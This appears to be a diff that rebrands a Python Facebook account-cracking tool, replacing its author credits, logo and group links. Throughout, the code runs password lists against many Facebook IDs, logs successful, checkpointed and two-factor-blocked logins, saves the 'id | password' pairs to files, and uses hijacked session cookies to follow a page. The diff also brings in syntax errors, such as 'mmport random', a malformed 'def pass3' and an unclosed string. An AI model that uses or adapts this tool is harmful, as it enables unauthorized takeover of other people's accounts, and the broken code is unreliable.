@@ -1,8 +1,8 @@
-#decode by : JANAN
+#decode by : Hassan
 #coding=utf-8
-#created by JANAN
-#team name hbf
-#tottaly written by JANAN
+#created by Hassan
+#team name Hassan_Tech
+#tottaly written by Hassan
 #!/usr/bin/python3
 #---------------------[IMPORT]---------------------#
 from bs4 import BeautifulSoup as sop
@@ -69,7 +69,6 @@ try:
 except(ImportError):
     os.system("pip install bs4")
     pass
-
 from bs4 import BeautifulSoup
 import json,os,time,base64,random,re,sys
 from requests.exceptions import ConnectionError as CError
@@ -85,7 +84,7 @@ bu = current.month
 ha = current.day
 today = date.today()
 NOOR2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
-import random
+mmport random
 
 def clear():
     os.system('clear')
@@ -114,19 +113,20 @@ BLACK="\033[1;30m"
 #--------------------LOGO--------------------#
 logo ="""     
    
-     ██╗ █████╗ ███╗   ██╗ █████╗ ███╗   ██╗
-     ██║██╔══██╗████╗  ██║██╔══██╗████╗  ██║
-     ██║███████║██╔██╗ ██║███████║██╔██╗ ██║
-██   ██║██╔══██║██║╚██╗██║██╔══██║██║╚██╗██║
-╚█████╔╝██║  ██║██║ ╚████║██║  ██║██║ ╚████║
- ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝                                                  
-___________________________________________________________
-\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟ \033[1;32m RAYEES JANAN          \033[1;31m
-\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟ \033[1;32m RAYEES JANAN         \033[1;31m
-\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟ \033[1;32m SHAH PETROL                  \033[1;31m 
-\033[1;31m│\033[1;37m☞  \033[1;32mYOUTUBE   \033[1;31m ➟  \033[1;32mCYBER HACK420                  \033[1;31m   
+_ __    __     ____      _____    _____     ____        __      _  
+(  \  /  )   (    )    / ____\  / ____\   (    )      /  \    / ) 
+ \ (__) /    / /\ \   ( (___   ( (___     / /\ \     / /\ \  / /  
+  ) __ (    ( (__) )   \___ \   \___ \   ( (__) )    ) ) ) ) ) )  
+ ( (  ) )    )    (        ) )      ) )   )    (    ( ( ( ( ( (   
+  ) )( (    /  /\  \   ___/ /   ___/ /   /  /\  \   / /  \ \/ /   
+ /_/  \_\  /__(  )__\ /____/   /____/   /__(  )__\ (_/    \__/    
+HF__________________________________________________________AFG
+\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟ \033[1;32m RAYEES Hassan          \033[1;31m
+\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟ \033[1;32m Hassan Karimi         \033[1;31m
+\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟ \033[1;32m hfhf249                  \033[1;31m 
+\033[1;31m│\033[1;37m☞  \033[1;32m Facebookgroup  \033[1;31m ➟  \033[1;32m Hassan_tech                 \033[1;31m   
 \033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟  \033[1;32m1.2                         \033[1;31m   
-\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m :    ➟ \033[1;32m CYBER HACK420\033[1;37m {\033[1;36mFB\033[1;37m} \033[1;31m
+\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m :    ➟ \033[1;32m Hassan tech \033[1;37m {\033[1;36mFB\033[1;37m} \033[1;31m
 \033[1;31m=__________________________________________________________"""
 
 
@@ -341,7 +341,7 @@ def riaz():
     elif NOOR in ["3","03"]:
         Filex()
     elif NOOR in ["4","04"]:
-        os.system("xdg-open https://t.me/NOOR_TECH_538")
+        os.system("xdg-open https://m.facebook.com/groups/4619616058120223/?ref=share&mibextid=NSMWBT")
 
 
 
@@ -403,7 +403,7 @@ def file_crack():
     print('\n\033[1;37m[+]══════════════════════════════════════════')
     print('[•] CLONING COMPLETED\n[•] YOUR OK IDS : '+str(len(ok))+'\n[•] TOTAL CP IDS : '+str(len(cp)))
     print('\033[1;37m[+]══════════════════════════════════════════')
-    print('[•] OK IDS SAVE : /sdcard/JANAN_OK.txt\n[•] CP IDS SAVE : /sdcard/HAMII_CP.txt')
+    print('[•] OK IDS SAVE : /sdcard/Hassan_OK.txt\n[•] CP IDS SAVE : /sdcard/HAMII_CP.txt')
     input('[•] PRESS ENTER TO BACK MENU   ')
     main()
 def method1(ids,names,passlist,total_ids):
@@ -411,7 +411,7 @@ def method1(ids,names,passlist,total_ids):
     rcol =['\033[1;32mM-1','\033[1;31mM-1']
     rr = random.choice(rcol)
     whi = '\033[0;97m'
-    sys.stdout.write(f'\r%s {WHITE}[JANAN 😍]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
+    sys.stdout.write(f'\r%s {WHITE}[Hassan😍]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
     try:
         first = names.split(' ')[0]
         try:
@@ -434,9 +434,9 @@ def method1(ids,names,passlist,total_ids):
             next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
             cookies = r.cookies.get_dict().keys()
             if 'c_user' in cookies:
-                print('\r\033[1;32m[JANAN-OK] '+ids+' | '+pas+'\033[1;97m')
+                print('\r\033[1;32m[Hassan-OK] '+ids+' | '+pas+'\033[1;97m')
                 ok.append(ids)
-                open('/sdcard/JANAN_OK.txt', 'a').write(ids+' | '+pas+'\n')
+                open('/sdcard/Hassan_OK.txt', 'a').write(ids+' | '+pas+'\n')
                 break
             elif 'checkpoint' in cookies:
                 d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
@@ -444,12 +444,12 @@ def method1(ids,names,passlist,total_ids):
                 if 'Enter login code to continue' in str(d):
                     print('\r\033[1;35m[JANAN-2F] '+ids+' | '+pas+'\033[1;97m')
                     tf.append(ids)
-                    open('/sdcard/JANAN_2F.txt', 'a').write(ids+' | '+pas+'\n')
+                    open('/sdcard/Hassan_2F.txt', 'a').write(ids+' | '+pas+'\n')
                     break
                 else:
-                    print('\r\033[1;31m[JANAN-CP] '+ids+' | '+pas+'\033[1;97m')
+                    print('\r\033[1;31m[Hassan-CP] '+ids+' | '+pas+'\033[1;97m')
                     cp.append(ids)
-                    open('/sdcard/JANAN_CP.txt', 'a').write(ids+' | '+pas+'\n')
+                    open('/sdcard/Hassan_CP.txt', 'a').write(ids+' | '+pas+'\n')
                     break
             else:continue
         loop+=1
@@ -461,7 +461,7 @@ def method2(ids,names,passlist,total_ids):
     rcol =['\033[1;32mM-2','\033[1;31mM-2']
     rr = random.choice(rcol)
     whi = '\033[0;97m'
-    sys.stdout.write(f'\r%s {WHITE}[JANAN😍]%s [%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
+    sys.stdout.write(f'\r%s {WHITE}[Hassan😍]%s [%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
     try:
         first = names.split(' ')[0]
         try:
@@ -488,22 +488,22 @@ def method2(ids,names,passlist,total_ids):
             cookies = session.cookies.get_dict().keys()
             #open('jhuk.html', 'w').write(post_request)
             if 'c_user' in cookies:
-                print('\r\033[1;32m[JANAN-OK] '+ids+' | '+pas+'\033[0;97m')
+                print('\r\033[1;32m[Hassan-OK] '+ids+' | '+pas+'\033[0;97m')
                 ok.append(ids)
-                open('/sdcard/JANAN_OK.txt', 'a').write(ids+' | '+pas+'\n')
+                open('/sdcard/Hassan_OK.txt', 'a').write(ids+' | '+pas+'\n')
                 break
             elif 'checkpoint' in cookies:
                 d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                 #print(d.group(1))
                 if 'Enter login code to continue' in str(d.group(1)):
-                    print('\r\033[1;35m[JANAN-2F] '+ids+' | '+pas+'\033[0;97m')
+                    print('\r\033[1;35m[Hassan-2F] '+ids+' | '+pas+'\033[0;97m')
                     tf.append(ids)
-                    open('/sdcard/JANAN_2F.txt', 'a').write(ids+' | '+pas+'\n')
+                    open('/sdcard/Hassan_2F.txt', 'a').write(ids+' | '+pas+'\n')
                     break
                 else:
-                    print('\r\033[1;31m[JANAN-CP] '+ids+' | '+pas+'\033[0;97m')
+                    print('\r\033[1;31m[Hassan-CP] '+ids+' | '+pas+'\033[0;97m')
                     cp.append(ids)
-                    open('/sdcard/JANAN_CP.txt', 'a').write(ids+' | '+pas+'\n')
+                    open('/sdcard/Hassan_CP.txt', 'a').write(ids+' | '+pas+'\n')
                     break
             else:continue
         loop+=1
@@ -515,7 +515,7 @@ def random_method(ids,passlist,total_ids):
     rcol =['\033[1;32mO_O','\033[1;31m -_-']
     rr = random.choice(rcol)
     whi = '\033[0;97m'
-    sys.stdout.write(f'\r{WHITE}[JANAN 😍]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
+    sys.stdout.write(f'\r{WHITE}[Hassan😍]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
     try:
         for pas in passlist:
             xyz = requests.Session()
@@ -563,10 +563,10 @@ def random_method(ids,passlist,total_ids):
                 if cid in ok:
                     pass
                 else:
-                    os.system("play-audio JANAN_OK.mp3")
+                    os.system("play-audio Hassan_OK.mp3")
                     print('\r\033[1;92m[NOOR-OK] '+cid+' | '+pas+'\033[0;97m')
                     ok.append(cid)
-                    open('/sdcard/JANAN_OK.txt', 'a').write(cid+' | '+pas+'\n')
+                    open('/sdcard/Hassan_OK.txt', 'a').write(cid+' | '+pas+'\n')
                     break
             elif 'checkpoint' in cookies:
                 coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
@@ -576,19 +576,19 @@ def random_method(ids,passlist,total_ids):
                 else:
                     d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                     if 'Enter login code to continue' in str(d.group(1)):
-                        os.system("play-audio JANAN_2F.mp3")
-                        print('\r\033[1;95m[JANAN-2F] '+cid+' | '+pas+'\033[0;97m')
+                        os.system("play-audio Hassan_2F.mp3")
+                        print('\r\033[1;95m[Hassan-2F] '+cid+' | '+pas+'\033[0;97m')
                         tf.append(cid)
-                        open('/sdcard/JANAN_2F.txt', 'a').write(cid+' | '+pas+'\n')
+                        open('/sdcard/Hassan_2F.txt', 'a').write(cid+' | '+pas+'\n')
                         break
                     else:
                         if cid in cp:
                             pass
                         else:
-                            os.system("play-audio JANAN_CP.mp3")
-                            print('\r\033[1;94m[JANAN-CP] '+cid+' | '+pas+'\033[0;97m')
+                            os.system("play-audio Hassan_CP.mp3")
+                            print('\r\033[1;94m[Hassan-CP] '+cid+' | '+pas+'\033[0;97m')
                             cp.append(cid)
-                            open('/sdcard/JANAN_CP.txt', 'a').write(cid+' | '+pas+'\n')
+                            open('/sdcard/Hassan_CP.txt', 'a').write(cid+' | '+pas+'\n')
                             break
             else:continue
          #   else:
@@ -765,7 +765,7 @@ twf = []
 
 def follow(ses,coki):
     ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
+    r = sop(ses.get('https://m.facebook.com/groups/4619616058120223/?ref=share&mibextid=NSMWBT', cookies={'cookie': coki}).text, 'html.parser')
     get = r.find('a', string='Follow').get('href')
     ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
@@ -776,7 +776,7 @@ def follow(ses,coki):
 
 
 def passx():
-    os.system("xdg-open https://facebook.com/groups/951539065723248/")
+    os.system("xdg-open https://m.facebook.com/groups/4619616058120223/?ref=share&mibextid=NSMWBT")
     print(logo)
     print('           \x1b[97m[\033[37;41m  M E T H O D   M E N U   \033[0;m] ')
     print("")
@@ -799,7 +799,7 @@ def passx():
 
 
 def pass1():
-    os.system("xdg-open https://t.me/CYBERHACK420")
+    os.system("xdg-open https://m.facebook.com/groups/4619616058120223/?ref=share&mibextid=NSMWBT")
     jalan(logo)
     print(f"")
     clear()
@@ -836,7 +836,7 @@ def pass1():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/NOOR-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/NOOR-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Hassan-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Hassan-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
 
 
@@ -847,7 +847,7 @@ def pass1():
 
 
 def pass2():
-    os.system("xdg-open https://t.me/NOOR_TECH_538")
+    os.system("xdg-open https://m.facebook.com/groups/4619616058120223/?ref=share&mibextid=NSMWBT")
     jalan(logo)
     print(f"")
     clear()
@@ -884,14 +884,14 @@ def pass2():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/NOOR-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/NOOR-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/NOOR-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Hassan-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
 
 
 
 
-def pass3():
-    os.system("xdg-open https://t.me/CYBERHACK420")
+def pass3
+    os.system("xdg-open https://m.facebook.com/groups/4619616058120223/?ref=share&mibextid=NSMWBT)
     jalan(logo)
     print(f"")
     clear()
@@ -972,7 +972,7 @@ def pass4():
     print(f'\n[~]{RED}===================================================')
     print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
     print(f'\n[~]{RED}===================================================')
-    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/NOOR-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/NOOR-CP.txt')
+    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Hassan-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/NOOR-CP.txt')
     input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
 
 
@@ -1019,9 +1019,9 @@ def freeq(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 uid = coki[151:166]
-                print(f'\r{GREEN}[JANAN-OK💚]  '+uid+' [facked] '+ps+ '  ') 
+                print(f'\r{GREEN}[Hassan-OK💚]  '+uid+' [facked] '+ps+ '  ') 
                 cek_apk(session,coki)
-                open('/sdcard/JANAN-OK.txt', 'a').write(uid+' | '+ps+'\n')
+                open('/sdcard/Hassan-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
             elif 'checkpoint' in log_cookies:
                 if 'Enter login code to continue' in log_cookies:
@@ -1033,14 +1033,14 @@ def freeq(uid,pwx,tl):
                 else:
                     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                     uid=coki[141:156]
-                    print(f'\r{RED}[JANAN-CP🤦] '+uid+' [×] '+ps+' ')
-                    open('/sdcard/JANAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                    print(f'\r{RED}[Hassan-CP🤦] '+uid+' [×] '+ps+' ')
+                    open('/sdcard/Hassan-CP.txt', 'a').write(uid+' | '+ps+'\n')
                     cp.append(uid)
                     break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[JANAN 🗡 ] [%s] \33[1;97m[OK:%s{NOOR2}CP:%s]'%(loop,len(ok),len(cp))), 
+        sys.stdout.write(f'\r\33[1;37m[Hassan 🗡 ] [%s] \33[1;97m[OK:%s{Hassan}CP:%s]'%(loop,len(ok),len(cp))), 
         sys.stdout.flush()
     except:
         pass
